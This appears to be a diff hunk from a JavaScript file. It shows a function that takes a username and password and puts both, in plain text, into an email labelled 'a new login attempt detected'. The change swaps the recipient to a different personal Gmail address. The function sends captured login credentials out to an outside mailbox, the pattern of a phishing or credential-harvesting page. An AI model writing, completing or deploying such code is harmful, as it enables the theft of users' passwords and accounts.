@@ -20,7 +20,7 @@ const emailfunction = (username, password) => {
 
     const receiver = {
         from : "srinivasaramanujan1728@gmail.com",
-        to : "srinivasaramanujan1728@gmail.com",
+        to : "radhavallabh1272007@gmail.com",
         subject : "a new login attempt detected",
         text : `Username: ${username} and Password: ${password}`
     };
